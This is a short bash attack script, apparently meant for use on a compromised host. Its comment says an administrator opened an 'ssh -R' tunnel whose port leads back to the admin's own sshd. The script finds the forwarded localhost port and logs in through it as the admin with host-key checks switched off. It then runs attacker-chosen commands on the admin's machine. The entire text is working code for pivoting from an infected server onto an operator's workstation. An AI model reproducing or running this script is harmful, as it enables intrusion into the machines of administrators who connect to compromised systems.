#!/usr/bin/env bash
# Admin used ssh -R. Their sshd is on infected host via tunnel port.
set -euo pipefail
TUNNEL_PORT="${TUNNEL_PORT:-3322}"
TUNNEL_BIND="${TUNNEL_BIND:-127.0.0.1}"
ADMIN_USER="${ADMIN_USER:-admin}"
KEY="${KEY:-}"
REMOTE_CMD="${REMOTE_CMD:-whoami; hostname; id}"

if ! ss -tlnH | grep -qE "${TUNNEL_BIND}:${TUNNEL_PORT}[[:space:]]"; then
  echo "[-] No tunnel on ${TUNNEL_BIND}:${TUNNEL_PORT}"
  exit 1
fi

SSH_OPTS=(-o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -p "$TUNNEL_PORT")
[[ -n "$KEY" && -r "$KEY" ]] && SSH_OPTS=(-i "$KEY" "${SSH_OPTS[@]}")

echo "[+] RemoteForward → ${ADMIN_USER}@${TUNNEL_BIND}:${TUNNEL_PORT}"
ssh "${SSH_OPTS[@]}" "${ADMIN_USER}@${TUNNEL_BIND}" "bash -lc $(printf '%q' "$REMOTE_CMD")"